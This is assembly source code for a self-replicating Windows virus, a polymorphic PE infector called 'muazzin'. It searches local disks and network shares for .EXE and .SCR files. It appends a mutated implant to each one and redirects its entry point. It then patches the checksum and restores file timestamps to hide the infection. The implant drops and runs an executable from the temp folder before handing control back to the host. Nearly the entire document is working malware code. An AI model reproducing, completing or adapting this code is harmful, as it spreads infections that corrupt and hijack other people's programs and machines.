;muazzin Win32 EXE poly infector

BITS 32

%include "\muazzin\muazzin.asi"
%include "\muazzin\samples\pe.inc"

;%define DEBUG 1

TYPE    EQU "i_pe"
VERSION EQU 0300h

CRC_POLY     equ 0EDB88320h
CRC_INIT     equ 0FFFFFFFFh

ADDSIZE equ 96*1024

FILLER  equ 90909090h
FILLER1 equ 90h

entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_QUERY
       jz .noquery
       mov esi, MT_QUERY+MT_APP
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       jmp short .skip1
  .noquery:
       test dword [esi+m_why], MT_APP
       jz .skip2
       pushad
       call dllinit
       jc .error
       call [ebp+GetTickCount]
       mov [ebp+seed], eax
       lea eax, [ebp+infect_pe]
       push eax
       call busca_recursiva
       lea eax, [ebp+file_handler2]
       push eax
       push byte 0
       call NetSearch
  .error:
       call dlldone
       popad
  .skip2:
       mov dword [esi+m_result], MR_DONE
  .skip1:
       ret 4

%include "\muazzin\samples\search2.asi"

file_handler2:
       pushad
       call delta
       mov eax, [esp+8*4+4]
       push eax
       call [ebp+SetCurrentDirectoryA]
       test eax, eax
       jz .done
       lea eax, [ebp+infect_pe]
       push eax
       call busca_disco                         ;busca dentro dos diretorios
  .done:
       popad
       ret 4

delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret

dllinit:
       call delta
       mov eax, [esi+m_dropper]
       mov [ebp+dropper], eax
       mov eax, [esi+m_droppersize]
       mov [ebp+droppersize], eax
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       lea esi, [ebp+import_table]
  .next_dll:
       lodsd
       test eax, eax
       jz .all_import
       push esi
       stc
       sbb ebx, ebx
       lea esi, [eax+ebp]
       push esi
       call [ebp+getmhnd]
       test eax, eax
       jnz .dll_in_mem
       push esi
       call [ebp+LoadLibraryA]
       test eax, eax
       jz .error
       mov ebx, eax
  .dll_in_mem:
       xchg ebx, eax                            ;ebx==module handle
       mov ecx, [esp]
       mov [ecx-4], eax                         ;-1==no unload dll
  .skip_dllname:
       lodsb
       test al, al
       jnz .skip_dllname
  .next_import:
       lodsd
       test eax, eax
       jz .dll_done
       add eax, ebp
       push eax
       push ebx
       call [ebp+getpaddr]
       mov [esi-4], eax
       test eax, eax
       jz .error
       jmp short .next_import
  .dll_done:
       pop esi
       jmp short .next_dll
  .error:
       pop esi
       stc
       db 0b0h
  .all_import:
       clc
       ret

dlldone:
       lea esi, [ebp+import_table]
  .next_unload:
       lodsd
       test eax, eax
       jz .all_unload
       inc eax
       jz .next_unload
       dec eax
       push eax
       call [ebp+FreeLibrary]
       jmp short .next_unload
  .all_unload:
       ret

handle1 equ 145h
STACK_BUFFER equ 150h

infect_pe:
       pushad
       add esp, -STACK_BUFFER
       mov esi, [esp+(8*4)+STACK_BUFFER+4]
  .seek0end:
       lodsb
       test al, al
       jnz .seek0end
       mov eax, dword [esi-5]
       and eax, 0dfdfdfffh
       cmp eax, ".SCR"
       je .ismine
       cmp eax, ".EXE"
       jne near .done
  .ismine:
       call delta
%ifdef DEBUG
       pushad
       sub esp, 100h
       push byte 4
       call .zkips1
       db "Infectar este arquivo?", 0
  .zkips1:
       push dword [esp+(8*4)+STACK_BUFFER+4+(8*4)+100h+2*4]
       push byte 0
       call [ebp+MessageBoxA]
       cmp eax, 7
       je .done123
       mov edi, esp
       mov esi, [edi+(8*4)+STACK_BUFFER+4+(8*4)+100h]
       push byte 1
       push edi
       push esi
  .zopy:
       lodsb
       stosb
       test al, al
       jnz .zopy
       mov dword [edi-1], ".bak"
       mov byte [edi+3], 0
       call [ebp+CopyFileA]
       test eax, eax
  .done123:
       lahf
       add esp, 100h
       sahf
       popad
       jz near .done
%else
       mov dword [ebp+delay], 3*1000
%endif
       push esp
       push dword [esp+(8*4)+STACK_BUFFER+8]
       call [ebp+FindFirstFileA]
       mov ecx, eax
       inc ecx
       jz near .done
       push eax
       call [ebp+FindClose]
       push dword 80h
       sub edi, edi
       mov esi, [esp]
       push dword [esp+(8*4)+STACK_BUFFER+8]
       call [ebp+SetFileAttributesA]
       test eax, eax
       jz near .done
       push edi
       push esi
       push byte 3
       push edi
       push edi
       push dword 0C0000000h
       push dword [esp+(8*4)+STACK_BUFFER+7*4]
       call [ebp+CreateFileA]
       mov [esp+handle1], eax
       inc eax
       jz near .done0
       mov eax, dword [esp+32]
       mov [ebp+.finalsize], eax
       add eax, ADDSIZE+1*1024
       push edi
       push eax
       push edi
       push byte 4              ;PAGE_READWRITE
       push edi
       push dword [esp+handle1+5*4]
       call [ebp+CreateFileMappingA]
       test eax, eax
       jz .done1
       push eax
       mov ecx, dword [esp+4+32]
       add ecx, ADDSIZE+1*1024
       push ecx
       push edi
       push edi
       push dword 0f001fh               ;FILE_MAP_WRITE
       push eax
       call [ebp+MapViewOfFile]
       test eax, eax
       jz .done2
       push eax
       call .check                      ;routine no clean stack!!!
       call delta
       call [ebp+UnmapViewOfFile]
  .done2:
       call [ebp+CloseHandle]
  .done1:
       push byte 0
       push byte 0
       push dword 12345678h
  .finalsize equ $-4
       push dword [esp+handle1+3*4]
       call [ebp+SetFilePointer]
       push dword [esp+handle1]
       call [ebp+SetEndOfFile]
       std
       lea edi, [esp+14h]
       push edi
       scasd
       scasd
       push edi
       scasd
       scasd
       push edi
       push dword [esp+handle1+3*4]
       cld
       call [ebp+SetFileTime]            ;eax!=0
       push dword [esp+handle1]
       call [ebp+CloseHandle]
  .done0:
       push dword [esp+0]
       push dword [esp+(8*4)+STACK_BUFFER+8]
       call [ebp+SetFileAttributesA]
  .done:
%ifndef DEBUG
       call delta
       push dword 3*1000
  delay equ $-4
       call [ebp+Sleep]
%endif
       add esp, STACK_BUFFER
       popad
       ret 4

bp_map    equ 0
bp_SIZEOF equ 4

  .check:
       pushad
       sub esp, bp_SIZEOF
       mov esi, [esp+(8*4)+bp_SIZEOF+4]
       cmp word [esi], "MZ"
       jne .error000
       mov [esp+bp_map], esi
       mov eax, [esi+3ch]
       add esi, eax
       call delta
       sub eax, [ebp+infect_pe.finalsize]
       jnc .error000
       cmp dword [esi], "PE"
       jne .error000
       cmp word [esi+PE_HEADER.Machine], 14Ch
       jne .error000
       cmp word [esi+PE_HEADER.Magic], 10Bh
       jne .error000
       movzx eax, word [esi+PE_HEADER.Characteristics]
       not al
       test ax, 2002h
       jnz .error000
       bts word [esi+PE_HEADER.Characteristics], 0
       mov ecx, [esi+PE_HEADER.DataDirectory+IMAGE_DIRECTORY_ENTRY_TLS*8+4]
       jecxz .normalf
  .error000:
       jmp .error0
  .normalf:
       mov edx, [esi+PE_HEADER.ImageBase]
       call delta
       mov ebx, [esi+PE_HEADER.AddressOfEntryPoint]
       test ebx, ebx
       jz .error000
       add ebx, edx
       mov [ebp+implant.jmp2host], ebx
       movzx ecx, word [esi+PE_HEADER.NumberOfSections]
       dec ecx
       js .error000
       jz .error000
       mov eax, ecx
       shl eax, 3               ;*8
       shl ecx, 5               ;*32
       add ecx, eax
       mov eax, [esi+PE_HEADER.AddressOfEntryPoint]
       sub eax, [esi+0f8h+SECTION_HEADER.VirtualAddress]
       jc near .error0
       call delta
       sub eax, [esi+0f8h+SECTION_HEADER.SizeOfRawData]
       jnc near .error0

       mov eax, [esi+0f8h+ecx+SECTION_HEADER.SizeOfRawData]
       cmp eax, [esi+0f8h+ecx+SECTION_HEADER.VirtualSize]
       jbe .zzkipz
       mov [esi+0f8h+ecx+SECTION_HEADER.VirtualSize]. eax
  .zzkipz:

       mov edi, [esi+0f8h+ecx+SECTION_HEADER.SizeOfRawData]
       mov eax, [esi+0f8h+ecx+SECTION_HEADER.VirtualAddress]
       mov ebx, eax
       add eax, edi
       add edi, [esi+0f8h+ecx+SECTION_HEADER.PointerToRawData]
       add edi, [esp+bp_map]
       mov [ebp+.destino], edi
       mov [esi+PE_HEADER.AddressOfEntryPoint], eax
       add dword [esi+0f8h+ecx+SECTION_HEADER.SizeOfRawData], ADDSIZE
       add dword [esi+0f8h+ecx+SECTION_HEADER.VirtualSize], ADDSIZE
       add ebx, [esi+0f8h+ecx+SECTION_HEADER.VirtualSize]
       mov eax, [esi+PE_HEADER.SectionAlignment]
       dec eax
       add ebx, eax
       not eax
       and ebx, eax
       mov [esi+PE_HEADER.SizeOfImage], ebx
       push esi
       push dword ADDSIZE
       push byte 40h
       call [ebp+GlobalAlloc]
       mov [ebp+.tmpmem], eax
       mov edi, eax
       mov esi, [ebp+dropper]
       mov ecx, [ebp+droppersize]
       rep movsb
       lea esi, [ebp+implant]
       mov ecx, implant_size
       rep movsb
       push byte 0                              ;flags
       push byte CMD_ALL                       ;commandmask
       push byte CMD2_ALL
       push dword REG_ALL                       ;regmask
       lea eax, [ebp+my_random]
       push eax                                 ;push offset my_rnd
       push byte 16                             ;jmp probability
       lea eax, [ebp+.add_eip]
       push eax                                 ;ptr to entry (rel)
       lea eax, [ebp+.polysize]
       push eax                                 ;ptr to size
       push dword FILLER                        ;filler
       push dword ADDSIZE                       ;size of outbuffer
       push dword ADDSIZE
       push byte 40h
       call [ebp+GlobalAlloc]
       mov [ebp+.tmpmem2], eax
       push eax                                 ;outbuffer
       mov ecx, [ebp+droppersize]
       push ecx                                 ;entrypoint (rel)
       add ecx, implant_size
       push ecx                                 ;size of inbuffer
       push dword [ebp+.tmpmem]                 ;inbuffer
       push byte 0                              ;initregptr (unused)
       push byte 0                              ;exitregptr (unused)
       push eax                                 ;user_param
       call kme_main
       add esp, byte 17*4
       mov edi, dword [ebp+.tmpmem2]
       mov esi, edi
       add esi, dword [ebp+.polysize]
  .fill:
       cmp dword [edi], FILLER
       jne .iscode
       cmp byte [edi+4], byte FILLER1
       jne .iscode
       pushad
       push byte 0
       push eax
       call my_random
       add esp, byte 4*2
       stosd
       popad
  .iscode:
       inc edi
       cmp edi, esi
       jbe .fill
       mov esi, dword [ebp+.tmpmem2]
       mov edi, 12345678h
  .destino equ $-4
       mov ecx, 12345678h
  .polysize equ $-4
       rep movsb
       sub edi, [esp+bp_map]
       push dword 12345678h
  .tmpmem equ $-4
       call [ebp+GlobalFree]
       push dword 12345678h
  .tmpmem2 equ $-4
       call [ebp+GlobalFree]
       mov esi, [esp]
       add dword [esi+PE_HEADER.AddressOfEntryPoint], 12345678h
  .add_eip equ $-4
       mov eax, [esi+PE_HEADER.FileAlignment]
       dec eax
       add edi, eax
       not eax
       and edi, eax
       mov [ebp+.finalsize], edi
       sub edx, edx
       mov dword [esi+PE_HEADER.CheckSum], edx
       push edi
       mov ecx, edi
       shr ecx, 1
       mov esi, [esp+bp_map+8]
  .crc:
       lodsw
       add dx, ax                       ;CheksumMappedFile-like code ;)
       adc dx, 0
       loop .crc
       pop eax
       add edx, eax
       pop eax
       mov [eax+PE_HEADER.CheckSum], edx
%ifndef DEBUG
       call delta
       shl dword [ebp+delay], 5
%endif
  .error0:
       add esp, bp_SIZEOF
       popad
       ret

_stackframe  equ 0                                    ;stack varz
_createfile  equ 4
_writefile   equ 8
_closehandle equ 12
_winexec     equ 16
_gettemppath equ 20
_globalalloc equ 24
_globalfree  equ 28
_deletefile  equ 32
_fname       equ 36

_stack_size  equ 292

implant:
       pushad
       sub esp, _stack_size
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta-implant
       pushad
       mov edx, 077e00000h
       call checkbase
       test eax, eax
       je .found
       mov edx, 0bff70000h
       call checkbase
       test eax, eax
       je .found
       mov edx, 077f00000h
       call checkbase
       test eax, eax
       jne near .fudeufeio
  .found:
       mov ecx, [edx+3ch]
       mov eax, ecx
       add eax, edx
       mov esi, [eax+120]           ;get kernel32 APIs...
       lea esi, [esi+edx+24]
       lodsd
       push eax
       lodsd
       push eax
       lodsd
       xchg ebx, eax
       pop ebp                                  ;ebp=RVA table
       pop ecx                                  ;ecx=number of names
       lodsd
       xchg esi, eax                            ;esi=names table
       xchg esi, ebx                            ;ebx=ordinal table
       neg edx
       sub esi, edx
       sub ebp, edx
       sub ebx, edx                            ;edx=-kernel32
       sub edi, edi
  .loopy:
       inc edi                                 ;edi=ordinal counter
       lodsd                                   ;eax=API name string
       pusha
       sub eax, edx
       xchg eax, esi
       push byte CRC_INIT
       pop ecx
  .next_byte:
       lodsb
       test al, al
       jz .done
       xor cl, al
       mov al, 8
  .next_bit:
       shr ecx, 1
       jnc .poly
       xor ecx, CRC_POLY
  .poly:
       dec al
       jnz .next_bit
       jmp short .next_byte
  .done:
       sub eax, eax
       cmp ecx, 0AAC4A387h                       ;CreateFileA
       je .patch_api
       inc eax
       cmp ecx, 03316A9EDh			;WriteFile
       je .patch_api
       inc eax
       cmp ecx, 04F6CEA0Bh			;CloseHandle
       je .patch_api
       inc eax
       cmp ecx, 0B7015EE1h			;WinExec
       je .patch_api
       inc eax
       cmp ecx, 00C88E9BEh                      ;GetTempPathA
       je .patch_api
       inc eax
       cmp ecx, 080438BCEh			;GlobalAlloc
       je .patch_api
       inc eax
       cmp ecx, 09C94E162h			;GlobalFree
       je .patch_api
       inc eax
       cmp ecx, 06E649434h                      ;DeleteFileA
       jne  .end_loopy
  .patch_api:
       lea esi, [esp+(16*4)+eax*4+_createfile]
       movzx eax, word [ebx+(edi*2)]             ;get ordinal
       dec eax
       mov eax, [ebp+(eax*4)]                  ;get rva
       sub eax, edx
       mov [esi], eax                          ;got it!
  .end_loopy:
       popa
       dec ecx
       jnz near .loopy                            ;all APIs scanned
       popad
       call .delta2
  .delta2:
       pop ebp
       sub ebp, .delta2-implant
       lea esi, [esp+_fname]
       push esi
       push dword 100h
       call [esp+_gettemppath+8]
       lea edi, [esi+eax]
       mov eax, "TEMP"
       stosd
       mov eax, "VEC."
       stosd
       mov eax, "EXE"
       stosd
       push byte 0
       push dword 80h
       push byte 2              ;CREATE_ALWAYS
       push byte 0
       push byte 0
       push dword 40000000h     ;GENERIC_WRITE
       push esi
       call [esp+_createfile+7*4]
       mov ecx, eax
       inc eax
       jz .no_drop
       push ecx
       push byte 0
       mov edx, esp
       push byte 0
       push edx
       push dword [ebp+droppersize-implant]
       sub ebp, [esp]
       push ebp
       push ecx
       call [esp+_writefile+7*4]
       pop eax
       call [esp+_closehandle+4]
%ifndef DEBUG
       push byte 0
%else
       push byte 5
%endif
       push esi
       call [esp+_winexec+2*4]
       push dword 00ff0000h
       pop ecx
       loop $
  .no_drop:
       lea eax, [esp+_fname]
       push eax
       call [esp+_deletefile+4]
  .fudeufeio:
       add esp, _stack_size
       popad
       push dword 12345678h
  .jmp2host equ $-4
       ret

checkbase:
       pushad
       mov [esp+7*4], edx
       sub eax, eax
       call .seh
       mov esp, [esp+8]
       sub eax, eax
       jmp short .error
  .seh:
       push dword [fs:eax]
       mov [fs:eax], esp
       cmp word [edx], "MZ"
       jne .error
       mov [esp+7*4+2*4], eax
  .error:
       pop dword [fs:eax]
       pop eax
       popad
       ret

droppersize dd 0

implant_end:

implant_size equ $-implant

%include "kme32.int"
%include "kme32bin.inc"

my_random:
       pushad
       mov eax, 12345678h
  seed equ $-4
       mov ecx, 41c64e6dh
       mul ecx
       add eax, 3039h
       and eax, 7ffffffh
       call delta
       mov [ebp+seed], eax
       mov ecx, [esp+(8*4)+8]
       jecxz .nolimit
       cdq
       div ecx
       xchg eax, edx
  .nolimit:
       mov [esp+(7*4)], eax
       popad
       ret

%include "\muazzin\samples\localnet.asi"

dropper  dd 0

getpaddr dd 0
getmhnd  dd 0

import_table dd kernel32
             dd mpr
%ifdef DEBUG
             dd user32
%endif
             dd 0

kernel32    db "KERNEL32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
.api006     dd .apiname006
.api007     dd .apiname007
.api008     dd .apiname008
.api009     dd .apiname009
.api010     dd .apiname010
.api011     dd .apiname011
.api012     dd .apiname012
.api013     dd .apiname013
.api014     dd .apiname014
.api015     dd .apiname015
.api016     dd .apiname016
.api017     dd .apiname017
%ifdef DEBUG
.api018     dd .apiname018
%endif
.api019     dd .apiname019
.api020     dd .apiname020
.api021     dd .apiname021
.api022     dd .apiname022
            dd 0
.apiname001 db "LoadLibraryA", 0
.apiname002 db "FreeLibrary", 0
.apiname003 db "CreateFileA", 0
.apiname004 db "CloseHandle", 0
.apiname005 db "GlobalAlloc", 0
.apiname006 db "GlobalFree", 0
.apiname007 db "GetTickCount", 0
.apiname008 db "CreateFileMappingA", 0
.apiname009 db "MapViewOfFile", 0
.apiname010 db "UnmapViewOfFile", 0
.apiname011 db "GetSystemDirectoryA", 0
.apiname012 db "FindNextFileA", 0
.apiname013 db "SetCurrentDirectoryA", 0
.apiname014 db "FindFirstFileA", 0
.apiname015 db "FindClose", 0
.apiname016 db "SetFileAttributesA", 0
.apiname017 db "SetFileTime", 0
%ifdef DEBUG
.apiname018 db "CopyFileA", 0
%endif
.apiname019 db "GetDriveTypeA", 0
.apiname020 db "SetFilePointer", 0
.apiname021 db "SetEndOfFile", 0
.apiname022 db "Sleep", 0

LoadLibraryA       equ kernel32.api001
FreeLibrary        equ kernel32.api002
CreateFileA        equ kernel32.api003
CloseHandle        equ kernel32.api004
GlobalAlloc        equ kernel32.api005
GlobalFree         equ kernel32.api006
GetTickCount       equ kernel32.api007
CreateFileMappingA equ kernel32.api008
MapViewOfFile      equ kernel32.api009
UnmapViewOfFile    equ kernel32.api010
GetSystemDirectoryA equ kernel32.api011
FindNextFileA      equ kernel32.api012
SetCurrentDirectoryA equ kernel32.api013
FindFirstFileA     equ kernel32.api014
FindClose          equ kernel32.api015
SetFileAttributesA equ kernel32.api016
SetFileTime        equ kernel32.api017
%ifdef DEBUG
CopyFileA          equ kernel32.api018
%endif
GetDriveTypeA      equ kernel32.api019
SetFilePointer     equ kernel32.api020
SetEndOfFile       equ kernel32.api021
Sleep              equ kernel32.api022

%ifdef DEBUG
user32      db "USER32.DLL", 0
.api001     dd .apiname001
            dd 0
.apiname001 db "MessageBoxA", 0
MessageBoxA equ user32.api001
%endif

mpr         db "MPR.DLL",0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname002
            dd 0
.apiname001 db "WNetOpenEnumA", 0
.apiname002 db "WNetEnumResourceA", 0
.apiname003 db "WNetCloseEnum", 0

WNetOpenEnumA     equ mpr.api001
WNetEnumResourceA equ mpr.api002
WNetCloseEnum     equ mpr.api003

